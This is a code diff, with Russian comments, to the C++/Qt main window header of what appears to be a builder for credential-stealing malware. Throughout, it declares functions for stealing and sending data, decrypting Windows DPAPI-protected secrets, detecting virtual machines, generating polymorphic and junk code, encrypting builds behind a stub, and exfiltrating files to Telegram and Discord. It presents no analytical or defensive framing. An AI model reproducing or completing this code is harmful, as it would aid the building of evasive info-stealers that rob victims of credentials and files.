@@ -46,6 +46,8 @@
 #include <tlhelp32.h>
 #include <psapi.h>
 #include <gdiplus.h>
+#include <openssl/evp.h>  // Добавлено для OpenSSL
+#include <openssl/rand.h> // Добавлено для OpenSSL
 
 QT_BEGIN_NAMESPACE
 namespace Ui { class MainWindow; }
@@ -65,9 +67,10 @@ extern bool CheckVirtualEnvironment();
 
 // Простая функция для шифрования строк во время компиляции (XOR)
 constexpr char encryptChar(char c, size_t pos) {
-    return c ^ (0xAA + (pos % 0xFF)); // Простое XOR-шифрование с позицией
+    return c ^ (0xAA + (pos % 0xFF));
 }
 
+// Объявление decryptString как внешней функции
 std::string decryptString(const std::string& encrypted, size_t keyOffset = 0);
 
 // Класс для генерации случайных чисел
@@ -93,10 +96,7 @@ public:
         : mainWindow(mainWindow), tempDir(tempDir) {}
 
 public slots:
-    void process() {
-        mainWindow->StealAndSendData(tempDir);
-        emit finished();
-    }
+    void process();
 
 signals:
     void finished();
@@ -106,13 +106,12 @@ private:
     std::string tempDir;
 };
 
-class MainWindow : public QMainWindow
-{
+class MainWindow : public QMainWindow {
     Q_OBJECT
 
 public:
     MainWindow(QWidget *parent = nullptr);
-    ~MainWindow();
+    ~MainWindow() override;
 
     // Публичные методы
     std::string generateRandomString(size_t length);
@@ -217,9 +216,9 @@ public slots:
 
 private slots:
     // Слоты для генерации кода и файлов
-    void generatePolymorphicCode();
-    void generateJunkCode();
-    void generateBuildKeyHeader();
+    std::string generatePolymorphicCode();
+    std::string generateJunkCode();
+    void generateBuildKeyHeader(const std::string& encryptionKey = "");
     void copyIconToBuild();
     void buildExecutable();
 
@@ -262,6 +261,19 @@ private slots:
     void on_buildButton_clicked();
     void on_clearLogsButton_clicked();
 
+    // Дополнительные методы из mainwindow.cpp
+    void animateSection(QLabel* sectionLabel, QSpacerItem* spacer);
+    std::string generateRandomKey(size_t length);
+    std::string generateStubCode(const std::string& key);
+    bool encryptBuild(const std::string& buildPath, const std::string& key);
+    bool compileBuild(const std::string& polymorphicCode, const std::string& junkCode);
+    void sendToTelegram(const std::string& data, const std::vector<std::string>& files);
+    void sendToDiscord(const std::string& data, const std::vector<std::string>& files);
+    void saveToLocalFile(const std::string& data, const std::string& dir);
+    QByteArray applyXOR(const QByteArray& data, const std::array<unsigned char, 16>& key);
+    QByteArray applyAES(const QByteArray& data, const std::array<unsigned char, 16>& key, const std::array<unsigned char, 16>& iv);
+    std::string decryptData(const std::string& encryptedData);
+
 private:
     // Приватные методы
     QByteArray decryptDPAPIData(const QByteArray& encryptedData);
@@ -270,7 +282,9 @@ private:
     Ui::MainWindow *ui;
     QNetworkAccessManager *manager;
     QMutex logMutex;
+    QMutex filesMutex; // Добавлен для потокобезопасности collectedFiles
     bool isBuilding = false;
+    QTimer *buildTimer; // Добавлен из mainwindow.cpp
     QTimer *statusCheckTimer;
     qint64 runId = 0;
     qint64 artifactId = 0;
